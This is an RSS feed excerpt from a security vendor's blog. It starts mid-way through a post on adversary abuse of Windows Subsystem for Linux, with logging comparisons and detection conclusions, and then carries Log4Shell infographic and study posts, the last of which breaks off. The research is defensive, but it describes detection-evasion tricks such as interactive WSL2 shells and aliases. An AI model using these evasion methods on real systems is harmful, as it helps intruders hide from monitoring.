<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29703" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig13-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig13.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig13" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig13-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig13-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig13.png" alt="" class="wp-image-29703" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig13.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig13-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig13-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig13-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.13 WSL2 Sysmon logs for downloaded content’s execution.</figcaption></figure>



<p>Stitching together the exact flow of events is more difficult with these events. Piping and redirection always add complexity to command line detection.</p>



<p>As shown in figure 14, we get a more detailed view in the security logs when the same scenario is run on WSL1.</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29705" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig14-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig14.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig14" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig14-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig14-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig14.png" alt="" class="wp-image-29705" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig14.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig14-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig14-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig14-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.14 WSL1 Audit logs for Linux commands -1</figcaption></figure>



<p>Two interesting points to note about the event shown is that the command line was translated to bash -c and the creator process name is <em>init</em>.</p>



<p>In Sysmon, we get the following relevant events (figures 15, 16).</p>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29706" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig15-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig15.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig15" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig15-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig15-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig15.png" alt="" class="wp-image-29706" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig15.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig15-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig15-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig15-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.15 WSL1 Sysmon logs for download.</figcaption></figure>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29707" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig16-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig16.png" data-orig-size="1400,1050" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig16" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig16-300x225.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig16-1070x803.png" loading="lazy" width="1400" height="1050" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig16.png" alt="" class="wp-image-29707" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig16.png 1400w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig16-300x225.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig16-1070x803.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig16-768x576.png 768w" sizes="(max-width: 1400px) 100vw, 1400px" /><figcaption>Fig.16 WSL1 Sysmon logs for downloaded content’s execution.</figcaption></figure>



<p>Interestingly, Sysmon logs show similar behaviour for the series of events for Linux for WSL1 and 2.</p>



<p>An important point to note: if the attacker uses an interactive WSL2 shell, we get no details of any Linux command or bash function runs. This is because the process is created inside the WSL2 virtual machine and Windows has visibility into it. This means that any malware written purely for WSL2 will be hard to detect.</p>



<p>On the other hand, we get the full command line details for WSL1 in audit logs. Aliases and symlinks could also be used to obscure actual command lines and bypass detection, as demonstrated in the series of figures 17, 18, and 19.</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img data-attachment-id="29708" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig17-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig17.png" data-orig-size="722,378" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig17" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig17-300x157.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig17.png" loading="lazy" width="722" height="378" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig17.png" alt="" class="wp-image-29708" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig17.png 722w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig17-300x157.png 300w" sizes="(max-width: 722px) 100vw, 722px" /><figcaption>Fig.17 Execution of alias poke in WSL2</figcaption></figure></div>



<div class="wp-block-image"><figure class="aligncenter size-full"><img data-attachment-id="29710" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig18-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig18.png" data-orig-size="766,524" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig18" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig18-300x205.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig18.png" loading="lazy" width="766" height="524" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig18.png" alt="" class="wp-image-29710" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig18.png 766w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig18-300x205.png 300w" sizes="(max-width: 766px) 100vw, 766px" /><figcaption>Fig.18 WSL launching notepad in WSL2</figcaption></figure></div>



<figure class="wp-block-image alignwide size-full"><img data-attachment-id="29711" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig19-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig19.png" data-orig-size="1103,583" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig19" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig19-300x159.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig19-1070x566.png" loading="lazy" width="1103" height="583" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig19.png" alt="" class="wp-image-29711" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig19.png 1103w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig19-300x159.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig19-1070x566.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig19-768x406.png 768w" sizes="(max-width: 1103px) 100vw, 1103px" /><figcaption>Fig.19 Details of alias poke</figcaption></figure>



<p>Aliases can be set either by using the alias command in Linux or by writing to the .bashrc file. This file can be found at <code>~/.bashrc</code> and <code>/home/&lt;username&gt;/.bashrc</code> via Linux and <code>\wsl$\home\&lt;username&gt;.bashrc</code> via Windows.</p>



<p>Aliases are translated and logged in WSL1 (fig. 20).</p>



<div class="wp-block-image"><figure class="aligncenter size-full"><img data-attachment-id="29712" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/attachment/fig20-2" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig20.png" data-orig-size="763,380" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Fig20" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig20-300x149.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Fig20.png" loading="lazy" width="763" height="380" src="https://blog.qualys.com/wp-content/uploads/2022/03/Fig20.png" alt="" class="wp-image-29712" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig20.png 763w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Fig20-300x149.png 300w" sizes="(max-width: 763px) 100vw, 763px" /><figcaption>Fig.20 Alias execution in WSL1</figcaption></figure></div>



<h3 id="toc5">Summary</h3>



<p>From this analysis of TTP #1, proxying execution, we can draw four primary conclusions:</p>



<ol><li>Linux to Windows process execution is properly logged for both WSL1 and WSL2. However, it can be used to bypass AWL.</li><li>WSL2 Windows to Linux process creation is slightly difficult to detect and piece together. No events are logged when an adversary uses an interactive WSL shell. Events can be muddled via aliases.</li><li>WSL1 Windows to Linux events are properly logged.</li><li>Defenders will need to account for malicious bash commands for detections based on process auditing.</li></ol>



<p>Our <a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2">next post in this blog series</a> will examine additional Windows Subsystem for Linux TTPs as well as various threat hunting and system hardening methods that can help defend your enterprise against these threats.</p>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/22/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-1/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[Senior Engineer, Threat Research, Qualys]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/a5da0efab1b59e29fb9828966a05e5a0?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/apradhan]]></authorPosts>
      <postCategory>
        <name><![CDATA[Vulnerabilities and Threat Research]]></name>
        <link><![CDATA[https://blog.qualys.com/category/vulnerabilities-threat-research]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p><em>This post is the first of a multi-part blog series that will explore and highlight the different risks that Windows Subsystem for Linux (WSL) poses to an enterprise IT environment. Here we examine a new Microsoft feature for GNU\Linux that increases the attack surface and introduces a lot more complexity to detection.</em></p>



<p class="has-text-align-right"><strong><a href="https://blog.qualys.com/vulnerabilities-threat-research/2022/04/20/implications-of-windows-subsystem-for-linux-for-adversaries-defenders-part-2">Go to Part 2 →</a></strong></p>



<h3 id="toc1">About Windows Subsystem for Linux</h3>



<p>Windows Subsystem for Linux (WSL) is a feature that allows Linux binaries to run on Windows without modification. WSL allows users to invoke processes in Linux from Windows and vice versa, access files across both the operating systems, share environment variables, and mix different commands together.</p>



<p>WSL has had two version releases with <a href="https://docs.microsoft.com/en-us/windows/wsl/compare-versions#whats-new-in-wsl-2">major architectural differences</a>:</p>



<ul><li>WSL1 uses a translation layer that implements Linux syscalls on top of the windows kernel. WSL1 achieves this via PICO processes and providers (lxss.sys and lxcore.sys). PICO processes are minimalistic and rely on a kernel mode driver to manage. <a href="https://docs.microsoft.com/en-in/archive/blogs/wsl/pico-process-overview">Microsoft’s WSL Blog</a> has published further details on the implications, motivations, and history of PICO processes.</li><li>WSL2 on the other hand uses a Virtual Machine to run the <a href="https://github.com/microsoft/WSL2-Linux-Kernel">Linux kernel source code</a> with the VM growing and shrinking dynamically based on usage.</li></ul>



<p>WSL is still in its early days and Microsoft is actively developing it and introducing additional features. Recent updates have <a href="https://docs.microsoft.com/en-us/windows/wsl/tutorials/gui-apps">added GUI support</a> for a fully integrated desktop experience.</p>



<p>The main goal of WSL is to allow users to use their favourite Linux tools while on Windows. The Qualys Research Team decided to shed some light on probable WSL abuse in the lifecycle of an attack.</p>



<h3 id="toc2">Our Test Environment Design</h3>



<p>Here’s how we set up our test environment. We used two Windows 10 virtual machines (version 20H2, build 19042) with one running WSL1 and the other WSL2. While you could run WSL1 and WSL2 together on the same machine, we separated them out for clarity in our logs. Our logging capability was PowerShell script block logs, <a href="https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/manage/component-updates/command-line-process-auditing">command line process auditing</a>, and System Monitor (Sysmon). Windows Defender Real Time Protection would mostly be left turned on, unless it blocked any tests.</p>



<h3 id="toc3">How an Attacker Enables Windows Subsystem for Linux</h3>



<p>Before we jump into actual threats, we should first understand how feasible WSL is as an attack vector. We will evaluate this based on how difficult it is for an attacker to install and or enable WSL. This will also help us determine at where in the attacker lifecycle will the techniques that abuse this threat fall.</p>



]]></customExcerpt>
    </item>
    <item>
      <title>Infographic: Log4Shell Vulnerability Impact by the Numbers</title>
      <link>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/infographic-log4shell-vulnerability-impact-by-the-numbers</link>
      <comments>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/infographic-log4shell-vulnerability-impact-by-the-numbers#respond</comments>
      <dc:creator><![CDATA[Qualys Research Team]]></dc:creator>
      <pubDate>Fri, 18 Mar 2022 13:01:00 +0000</pubDate>
      <category><![CDATA[Vulnerabilities and Threat Research]]></category>
      <category><![CDATA[log4shell]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29719</guid>
      <description><![CDATA[The full scope of risk presented by the Log4Shell vulnerability is something unprecedented, spanning every type of organization across every industry. Hard to find but easy to exploit, Log4Shell immediately places hundreds of millions of Java-based applications, databases, and devices at risk.&#160;Remediating this vulnerability has turned out not to be a simple, one-and-done process. Multiple [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p>The full scope of risk presented by the Log4Shell vulnerability is something unprecedented, spanning every type of organization across every industry. Hard to find but easy to exploit, Log4Shell immediately places hundreds of millions of Java-based applications, databases, and devices at risk.&nbsp;Remediating this vulnerability has turned out not to be a simple, one-and-done process. Multiple detection methods are required.&nbsp;</p>



<h2><strong>Log4Shell Research Study Reveals Enterprise IT Exposure &amp; Response</strong></h2>



<p>To shed a unique light on Log4Shell’s impact one month after its disclosure, the Qualys Research Team analyzed anonymized security data from across its global network. This infographic reveals enterprise IT&#8217;s exposure and response to Log4Shell across criteria such as the threat landscape, vulnerability trends, remediation trends, and attack patterns.</p>



<span id="more-29719"></span>



<figure class="wp-block-image size-full"><a href="https://blog.qualys.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1.png"><img data-attachment-id="29739" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/infographic-log4shell-vulnerability-impact-by-the-numbers/attachment/qualys-log4shell-infographic-1070x5250-1" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1.png" data-orig-size="1070,5250" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Qualys-Log4Shell-Infographic-1070&#215;5250-1" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1-300x1472.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1.png" loading="lazy" width="1070" height="5250" src="https://blog.qualys.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1.png" alt="" class="wp-image-29739" srcset="https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1.png 1070w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1-300x1472.png 300w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1-768x3768.png 768w, https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1-313x1536.png 313w" sizes="(max-width: 1070px) 100vw, 1070px" /></a></figure>



<p><em>* 30% statistic does not account for any mitigations applied</em></p>



<p><a href="https://blog.qualys.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic.pdf">Download PDF</a></p>



<p>Post this infographic to your social media by using the share buttons at the bottom of the page.</p>



<p>To add this infographic to your blog or article, copy/paste the following:</p>



<textarea onclick='this.focus();this.select()' style='width:100%;height:120px'><p><strong> Source: Qualys Inc. </strong><br /><br /><a href='https://blog.qualys.com/vulnerabilities-threat-research/2022/03/17/infographic-log4shell-impact-by-the-numbers'><img src='https://2jws2s3y97dy39441y2lgm98-wpengine.netdna-ssl.com/wp-content/uploads/2022/03/Qualys-Log4Shell-Infographic-1070x5250-1.png' alt='Log4Shell research study by Qualys reveals Log4Shell impact on enterprise IT' border='0' /></a></p></textarea>
]]></content:encoded>
      <wfw:commentRss>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/infographic-log4shell-vulnerability-impact-by-the-numbers/feed</wfw:commentRss>
      <slash:comments>0</slash:comments>
      <authorTitle><![CDATA[Security Researchers, Qualys]]></authorTitle>
      <authorAvatar><![CDATA[https://secure.gravatar.com/avatar/737a8923b036a6160800197062848401?s=192&d=mm&r=g]]></authorAvatar>
      <authorPosts><![CDATA[https://blog.qualys.com/author/qsa]]></authorPosts>
      <postCategory>
        <name><![CDATA[Vulnerabilities and Threat Research]]></name>
        <link><![CDATA[https://blog.qualys.com/category/vulnerabilities-threat-research]]></link>
      </postCategory>
      <customExcerpt><![CDATA[
<p>The full scope of risk presented by the Log4Shell vulnerability is something unprecedented, spanning every type of organization across every industry. Hard to find but easy to exploit, Log4Shell immediately places hundreds of millions of Java-based applications, databases, and devices at risk.&nbsp;Remediating this vulnerability has turned out not to be a simple, one-and-done process. Multiple detection methods are required.&nbsp;</p>



<h2><strong>Log4Shell Research Study Reveals Enterprise IT Exposure &amp; Response</strong></h2>



<p>To shed a unique light on Log4Shell’s impact one month after its disclosure, the Qualys Research Team analyzed anonymized security data from across its global network. This infographic reveals enterprise IT&#8217;s exposure and response to Log4Shell across criteria such as the threat landscape, vulnerability trends, remediation trends, and attack patterns.</p>



]]></customExcerpt>
    </item>
    <item>
      <title>Qualys Study Reveals How Enterprises Responded to Log4Shell</title>
      <link>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/qualys-study-reveals-how-enterprises-responded-to-log4shell</link>
      <comments>https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/qualys-study-reveals-how-enterprises-responded-to-log4shell#respond</comments>
      <dc:creator><![CDATA[Mehul Revankar]]></dc:creator>
      <pubDate>Fri, 18 Mar 2022 13:00:00 +0000</pubDate>
      <category><![CDATA[Vulnerabilities and Threat Research]]></category>
      <category><![CDATA[log4shell]]></category>
      <guid isPermaLink="false">https://blog.qualys.com/?p=29654</guid>
      <description><![CDATA[On December 9, 2021, a critical zero-day vulnerability affecting Apache’s Log4j2 library, a Java-based logging utility, was disclosed to the world. This was no small announcement. As the third most used computer language, Java is practically ubiquitous. Its Log4j2 library is extremely popular. Billions of devices around the globe currently run Java. Most enterprises likely [&#8230;]]]></description>
      <content:encoded><![CDATA[
<p>On December 9, 2021, a critical zero-day vulnerability affecting Apache’s Log4j2 library, a Java-based logging utility, was disclosed to the world. This was no small announcement. As the third most used computer language, Java is practically ubiquitous. Its Log4j2 library is extremely popular. Billions of devices around the globe currently run Java. Most enterprises likely have multiple versions of it running throughout their computing systems.</p>



<p>This new weakness discovered in Java was soon given a name: Log4Shell. In the cybersecurity hall of fame – one that includes nasty past exploits like HeartBleed, WannaCry, and ShellShock – Log4Shell was found to be in a league all its own. Difficult to locate but easy to exploit, it was clear that this vulnerability would have a massive impact across nearly every industry&#8230; hitting only two weeks before the holidays.</p>



<h3>The Cybersecurity Industry Springs into Action</h3>



<p>It didn’t take very long for this critical Java vulnerability to be exploited in the wild. Nearly<a href="https://www.itpro.co.uk/security/zero-day-exploit/361847/log4shell-zero-day-vulnerability-numbers-revealed"> 1 million attack attempts</a> were launched in just 72 hours following the Log4Shell vulnerability&#8217;s disclosure.</p>



<p>There was no time to waste. The bad guys didn’t care that it was the holiday season. With many companies preparing to operate with skeleton IT staffing during the final two weeks of 2021, hackers and attackers saw an opportunity. The race was on.</p>



<p>Qualys was among the<a href="https://www.qualys.com/log4shell-cve-2021-44228/"> first industry players</a> to analyze the threat and develop effective countermeasures to mitigate this dangerous new vulnerability. Our<a href="https://www.qualys.com/cloud-platform/"> Qualys Cloud Platform</a> is a unified cybersecurity and compliance solution comprised of a suite of<a href="https://www.qualys.com/apps/"> specialized cloud apps</a> that help global enterprises manage their vulnerabilities, threats, and exploits.</p>



<p>We’ve indexed more than 10 trillion datapoints across our installed enterprise customer base and completed 6 billion IP scans per year with 75 million cloud agents deployed in hybrid IT environments globally. With that kind of scale, Qualys occupies a unique vantage point capable of ferreting out Log4Shell wherever it hides.</p>



<span id="more-29654"></span>



<hr class="wp-block-separator is-style-wide"/>



<p class="has-text-align-center"><strong><strong>Quickly identify Log4Shell vulnerabilities using our cloud platform</strong></strong></p>



<div class="wp-block-button is-style-fill" style="margin: 0 auto 1em; text-align: center;"><a class="wp-block-button__link has-white-color has-text-color has-background" href="https://www.qualys.com/forms/web-application-scanning-log4shell/" style="background-color:#ed2e26">Try it Now</a></div>



<hr class="wp-block-separator is-style-wide"/>



<h3>Enterprise IT Response to Log4Shell, by the Numbers</h3>



<p>Qualys Research Team analyzed anonymized security data across the networks of global enterprises using Qualys Cloud Platform. By examining how and where the Log4j2 library was implemented across organizations worldwide, we were able to provide the following insights on Log4Shell’s impact within a month of its disclosure.</p>



<p>Here’s a window into how the world’s enterprises responded.</p>



<figure class="wp-block-image size-large"><img data-attachment-id="29727" data-permalink="https://blog.qualys.com/vulnerabilities-threat-research/2022/03/18/qualys-study-reveals-how-enterprises-responded-to-log4shell/attachment/30-percent-vulnerable" data-orig-file="https://blog.qualys.com/wp-content/uploads/2022/03/30-percent-vulnerable.png" data-orig-size="1440,396" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="30-percent-vulnerable" data-image-description="" data-image-caption="" data-medium-file="https://blog.qualys.com/wp-content/uploads/2022/03/30-percent-vulnerable-300x83.png" data-large-file="https://blog.qualys.com/wp-content/uploads/2022/03/30-percent-vulnerable-1070x294.png" loading="lazy" width="1070" height="294" src="https://blog.qualys.com/wp-content/uploads/2022/03/30-percent-vulnerable-1070x294.png" alt="" class="wp-image-29727" 